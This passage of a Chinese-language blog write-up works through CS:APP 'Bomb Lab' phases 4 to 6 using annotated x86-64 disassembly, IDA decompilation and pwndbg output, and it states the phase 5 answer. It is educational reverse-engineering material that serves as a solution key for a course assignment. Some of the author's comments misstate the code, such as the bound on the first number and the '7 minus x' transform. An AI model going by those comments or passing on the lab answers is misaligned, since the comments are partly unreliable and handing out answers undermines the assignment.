class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400fd8</span> &lt;+<span class="number">10</span>&gt;:<span class="keyword">shr</span>    <span class="built_in">ecx</span>,<span class="number">0x1f</span></span><br><span class="line"><span class="number">0x0000000000400fdb</span> &lt;+<span class="number">13</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line"><span class="number">0x0000000000400fdd</span> &lt;+<span class="number">15</span>&gt;:<span class="keyword">sar</span>    <span class="built_in">eax</span>,<span class="number">1</span></span><br><span class="line"><span class="number">0x0000000000400fdf</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">ecx</span>,[<span class="built_in">rax</span>+<span class="built_in">rsi</span>*<span class="number">1</span>]</span><br><span class="line"><span class="number">0x0000000000400fe2</span> &lt;+<span class="number">20</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="built_in">edi</span></span><br><span class="line"># 第一轮循环：<span class="built_in">ecx</span> = (<span class="number">0xe</span> &gt;&gt; <span class="number">0x1f</span> + <span class="number">0xe</span>) &gt;&gt; <span class="number">1</span>，然后和我们输入的第二个参数比较</span><br><span class="line"><span class="number">0x0000000000400fe4</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x400ff2</span> &lt;func4+<span class="number">36</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400fe6</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">edx</span>,[<span class="built_in">rcx</span>-<span class="number">0x1</span>]</span><br><span class="line"># 第三个参数：[<span class="built_in">rcx</span>-<span class="number">1</span>]</span><br><span class="line"><span class="number">0x0000000000400fe9</span> &lt;+<span class="number">27</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line"><span class="number">0x0000000000400fee</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400ff0</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400ff2</span> &lt;+<span class="number">36</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x0000000000400ff7</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0x0000000000400ff9</span> &lt;+<span class="number">43</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400ffb</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">esi</span>,[<span class="built_in">rcx</span>+<span class="number">0x1</span>]    </span><br><span class="line"><span class="number">0x0000000000400ffe</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line"><span class="number">0x0000000000401003</span> &lt;+<span class="number">53</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">rax</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x1</span>]</span><br><span class="line"><span class="number">0x0000000000401007</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x000000000040100b</span> &lt;+<span class="number">61</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></p><p>一个递归函数，有点绕。。。<br>借助一下ida - - (我好菜<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">func4</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = (a3 - a2) / <span class="number">2</span> + a2;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * func4(a1, a2, (v3 - <span class="number">1</span>));</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; a1 )</span><br><span class="line">    result = <span class="number">2</span> * func4(a1, (v3 + <span class="number">1</span>), a3) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>很清晰，不能大于不能小于，必须等于（当然在递归中等于也可以<br>仔细想想，这不就是二分查找吗（x<br>所以只要能被二分查找发现的都可以</p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>汇编代码如下<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000401062</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">push</span>   <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x0000000000401063</span> &lt;+<span class="number">1</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x20</span></span><br><span class="line"><span class="number">0x0000000000401067</span> &lt;+<span class="number">5</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x000000000040106a</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> <span class="built_in">fs</span>:<span class="number">0x28</span></span><br><span class="line"><span class="number">0x0000000000401073</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x18</span>],<span class="built_in">rax</span></span><br><span class="line"><span class="number">0x0000000000401078</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">xor</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x000000000040107a</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40131b</span> &lt;string_length&gt;</span><br><span class="line"><span class="number">0x000000000040107f</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x6</span></span><br><span class="line"># 比较字符串长度</span><br><span class="line"><span class="number">0x0000000000401082</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401084</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000401089</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line"><span class="number">0x000000000040108b</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">movzx</span>  <span class="built_in">ecx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="built_in">rax</span>*<span class="number">1</span>]</span><br><span class="line"><span class="number">0x000000000040108f</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>],<span class="built_in">cl</span></span><br><span class="line"><span class="number">0x0000000000401092</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>]</span><br><span class="line"><span class="number">0x0000000000401096</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">and</span>    <span class="built_in">edx</span>,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x0000000000401099</span> &lt;+<span class="number">55</span>&gt;:<span class="keyword">movzx</span>  <span class="built_in">edx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x4024b0</span>]</span><br><span class="line"><span class="number">0x00000000004010a0</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x10</span>],<span class="built_in">dl</span></span><br><span class="line"><span class="number">0x00000000004010a4</span> &lt;+<span class="number">66</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x1</span></span><br><span class="line"># 每次+<span class="number">1</span></span><br><span class="line"><span class="number">0x00000000004010a8</span> &lt;+<span class="number">70</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="number">0x6</span></span><br><span class="line"># 循环<span class="number">6</span>次</span><br><span class="line"><span class="number">0x00000000004010ac</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010ae</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x16</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004010b3</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x40245e</span></span><br><span class="line"><span class="number">0x00000000004010b8</span> &lt;+<span class="number">86</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rdi</span>,[<span class="built_in">rsp</span>+<span class="number">0x10</span>]</span><br><span class="line"><span class="number">0x00000000004010bd</span> &lt;+<span class="number">91</span>&gt;:<span class="keyword">call</span>   <span class="number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line"><span class="number">0x00000000004010c2</span> &lt;+<span class="number">96</span>&gt;:<span class="keyword">test</span>   <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x00000000004010c4</span> &lt;+<span class="number">98</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010c6</span> &lt;+<span class="number">100</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x00000000004010cb</span> &lt;+<span class="number">105</span>&gt;:<span class="keyword">nop</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x00000000004010d0</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010d2</span> &lt;+<span class="number">112</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004010d7</span> &lt;+<span class="number">117</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010d9</span> &lt;+<span class="number">119</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x18</span>]</span><br><span class="line"><span class="number">0x00000000004010de</span> &lt;+<span class="number">124</span>&gt;:<span class="keyword">xor</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> <span class="built_in">fs</span>:<span class="number">0x28</span></span><br><span class="line"><span class="number">0x00000000004010e7</span> &lt;+<span class="number">133</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010ee</span> &lt;phase_5+<span class="number">140</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010e9</span> &lt;+<span class="number">135</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400b30</span> &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"><span class="number">0x00000000004010ee</span> &lt;+<span class="number">140</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x20</span></span><br><span class="line"><span class="number">0x00000000004010f2</span> &lt;+<span class="number">144</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x00000000004010f3</span> &lt;+<span class="number">145</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></p><p>很显然是一个大循环<br>动调发现有一个类似于代换表的东西，需要在循环中给出索引，然后查表，最后和字符串对比</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s <span class="number">0x4024B0</span></span><br><span class="line"><span class="number">0x4024b0</span> &lt;<span class="built_in">array</span>&gt;:<span class="string">&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s <span class="number">0x40245e</span></span><br><span class="line"><span class="number">0x40245e</span>:<span class="string">&quot;flyers&quot;</span></span><br></pre></td></tr></table></figure><p>应该是取前面的<code>maduiersnfotvbyl</code><br>索引值为[9, 15, 14, 5, 6, 7]<br>取ascii码值和0xf与后等于索引值即可, “yonefg“</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>部分汇编代码如下</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000401106</span> &lt;+<span class="number">18</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40145c</span> &lt;read_six_numbers&gt;</span><br><span class="line">   <span class="number">0x000000000040110b</span> &lt;+<span class="number">23</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">r14</span>,<span class="built_in">rsp</span></span><br><span class="line">   <span class="number">0x000000000040110e</span> &lt;+<span class="number">26</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">r12d</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401114</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbp</span>,<span class="built_in">r13</span></span><br><span class="line">   # <span class="built_in">rsp</span> = <span class="built_in">rbp</span> 都指向我们输入的<span class="number">6</span>个数字，通过栈传递参数，返回值存入<span class="built_in">rax</span></span><br><span class="line">   <span class="number">0x0000000000401117</span> &lt;+<span class="number">35</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">r13</span>+<span class="number">0x0</span>]</span><br><span class="line">   # 输入的第一个数字进入<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x000000000040111b</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040111e</span> &lt;+<span class="number">42</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401121</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">jbe</span>    <span class="number">0x401128</span> &lt;phase_6+<span class="number">52</span>&gt;</span><br><span class="line">   # -<span class="number">1</span> 后和<span class="number">5</span>进行比较, 小于等于则跳转，即第一位数字必须小于<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401123</span> &lt;+<span class="number">47</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401128</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">add</span>    <span class="built_in">r12d</span>,<span class="number">0x1</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040112c</span> &lt;+<span class="number">56</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">r12d</span>,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x0000000000401130</span> &lt;+<span class="number">60</span>&gt;:<span class="keyword">je</span>     <span class="number">0x401153</span> &lt;phase_6+<span class="number">95</span>&gt;</span><br><span class="line"><span class="symbol">loop1:</span></span><br><span class="line">   # 跳出循环</span><br><span class="line">   <span class="number">0x0000000000401132</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">r12d</span></span><br><span class="line">    # 循环中的第二层循环</span><br><span class="line">   <span class="number">0x0000000000401135</span> &lt;+<span class="number">65</span>&gt;:<span class="keyword">movsxd</span> <span class="built_in">rax</span>,<span class="built_in">ebx</span></span><br><span class="line">   <span class="number">0x0000000000401138</span> &lt;+<span class="number">68</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rax</span>*<span class="number">4</span>]</span><br><span class="line">        # 索引取出数字</span><br><span class="line">   <span class="number">0x000000000040113b</span> &lt;+<span class="number">71</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>+<span class="number">0x0</span>],<span class="built_in">eax</span></span><br><span class="line">        # 比较取出的数字是否和第一个数字相同，相同则爆炸</span><br><span class="line">   <span class="number">0x000000000040113e</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401145</span> &lt;phase_6+<span class="number">81</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401140</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401145</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">add</span>    <span class="built_in">ebx</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0000000000401148</span> &lt;+<span class="number">84</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ebx</span>,<span class="number">0x5</span></span><br><span class="line">        # <span class="built_in">ebx</span> = <span class="number">1</span>-<span class="number">6</span>，比较所有的数字</span><br><span class="line">   <span class="number">0x000000000040114b</span> &lt;+<span class="number">87</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x401135</span> &lt;phase_6+<span class="number">65</span>&gt;</span><br><span class="line">    # 跳出第二层循环</span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040114d</span> &lt;+<span class="number">89</span>&gt;:<span class="keyword">add</span>    <span class="built_in">r13</span>,<span class="number">0x4</span></span><br><span class="line">    # 动调发现<span class="built_in">r13</span>指向第一个数字，+<span class="number">4</span>后指向第二个数字</span><br><span class="line">   <span class="number">0x0000000000401151</span> &lt;+<span class="number">93</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401114</span> &lt;phase_6+<span class="number">32</span>&gt;</span><br><span class="line">    # 循环，退出条件为<span class="built_in">r12d</span> = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loop2:</span></span><br><span class="line">   <span class="number">0x0000000000401153</span> &lt;+<span class="number">95</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rsi</span>,[<span class="built_in">rsp</span>+<span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x0000000000401158</span> &lt;+<span class="number">100</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">r14</span></span><br><span class="line">   <span class="number">0x000000000040115b</span> &lt;+<span class="number">103</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="number">0x7</span></span><br><span class="line">   # 循环开始</span><br><span class="line">   <span class="number">0x0000000000401160</span> &lt;+<span class="number">108</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">ecx</span></span><br><span class="line">   <span class="number">0x0000000000401162</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line">   <span class="number">0x0000000000401164</span> &lt;+<span class="number">112</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>],<span class="built_in">edx</span></span><br><span class="line">    # 数字 = <span class="built_in">edx</span>( <span class="number">0x7</span> - 数字)</span><br><span class="line">   <span class="number">0x0000000000401166</span> &lt;+<span class="number">114</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x000000000040116a</span> &lt;+<span class="number">118</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="built_in">rsi</span></span><br><span class="line">   <span class="number">0x000000000040116d</span> &lt;+<span class="number">121</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401160</span> &lt;phase_6+<span class="number">108</span>&gt;</span><br><span class="line">    # 退出条件：当前数字为<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>loop1中主要是比较六个数字中是否有相同的数字</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x000000000040116f</span> &lt;+<span class="number">123</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x0</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">0x0000000000401174</span> &lt;+<span class="number">128</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401197</span> &lt;phase_6+<span class="number">163</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="symbol">loop3:</span></span><br><span class="line">   <span class="number">0x0000000000401176</span> &lt;+<span class="number">130</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x8</span>]</span><br><span class="line">   # node节点</span><br><span class="line">   <span class="number">0x000000000040117a</span> &lt;+<span class="number">134</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040117d</span> &lt;+<span class="number">137</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">   <span class="number">0x000000000040117f</span> &lt;+<span class="number">139</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">   # 循环，一直到<span class="built_in">eax</span>和数字相等</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401181</span> &lt;+<span class="number">141</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401188</span> &lt;phase_6+<span class="number">148</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401183</span> &lt;+<span class="number">143</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x6032d0</span></span><br><span class="line">   <span class="number">0x0000000000401188</span> &lt;+<span class="number">148</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rsi</span>*<span class="number">2</span>+<span class="number">0x20</span>],<span class="built_in">rdx</span></span><br><span class="line">   # 将node节点存入到栈空间中</span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040118d</span> &lt;+<span class="number">153</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsi</span>,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0000000000401191</span> &lt;+<span class="number">157</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rsi</span>,<span class="number">0x18</span></span><br><span class="line">   # 一直到<span class="built_in">rsi</span>=<span class="number">0x18</span>，即遍历完全<span class="number">6</span>个数字</span><br><span class="line">   <span class="number">0x0000000000401195</span> &lt;+<span class="number">161</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4011ab</span> &lt;phase_6+<span class="number">183</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401197</span> &lt;+<span class="number">163</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rsi</span>*<span class="number">1</span>]</span><br><span class="line">   <span class="number">0x000000000040119a</span> &lt;+<span class="number">166</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="number">0x1</span></span><br><span class="line">   # 第一个数字</span><br><span class="line">   <span class="number">0x000000000040119d</span> &lt;+<span class="number">169</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x401183</span> &lt;phase_6+<span class="number">143</span>&gt;</span><br><span class="line">   # 如果小于等于则向上跳</span><br><span class="line">   <span class="number">0x000000000040119f</span> &lt;+<span class="number">171</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004011a4</span> &lt;+<span class="number">176</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x6032d0</span> </span><br><span class="line">   # <span class="number">0x6032d0</span> -&gt; <span class="number">0x000000010000014c</span></span><br><span class="line">   <span class="number">0x00000000004011a9</span> &lt;+<span class="number">181</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">    # 向上跳</span><br></pre></td></tr></table></figure><p>这一部分也详细写入注释中<br>经过动调发现实现了将输入的数字减去7，并且将对应的node节点都移动到栈中</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00000000004011ab</span> &lt;+<span class="number">183</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x20</span>]</span><br><span class="line"><span class="number">0x00000000004011b0</span> &lt;+<span class="number">188</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rax</span>,[<span class="built_in">rsp</span>+<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x00000000004011b5</span> &lt;+<span class="number">193</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rsi</span>,[<span class="built_in">rsp</span>+<span class="number">0x50</span>]</span><br><span class="line"><span class="number">0x00000000004011ba</span> &lt;+<span class="number">198</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rcx</span>,<span class="built_in">rbx</span></span><br><span class="line"># start</span><br><span class="line"><span class="number">0x00000000004011bd</span> &lt;+<span class="number">201</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x00000000004011c0</span> &lt;+<span class="number">204</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rcx</span>+<span class="number">0x8</span>],<span class="built_in">rdx</span></span><br><span class="line"><span class="number">0x00000000004011c4</span> &lt;+<span class="number">208</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x00000000004011c8</span> &lt;+<span class="number">212</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x00000000004011cb</span> &lt;+<span class="number">215</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4011d2</span> &lt;phase_6+<span class="number">222</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004011cd</span> &lt;+<span class="number">217</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rcx</span>,<span class="built_in">rdx</span></span><br><span class="line"><span class="number">0x00000000004011d0</span> &lt;+<span class="number">220</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;</span><br><span class="line"># end  遍历六个node</span><br><span class="line"><span class="number">0x00000000004011d2</span> &lt;+<span class="number">222</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x8</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004011da</span> &lt;+<span class="number">230</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="number">0x5</span></span><br><span class="line"><span class="number">0x00000000004011df</span> &lt;+<span class="number">235</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">0x00000000004011e3</span> &lt;+<span class="number">239</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x00000000004011e5</span> &lt;+<span class="number">241</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>],<span class="built_in">eax</span></span><br><span 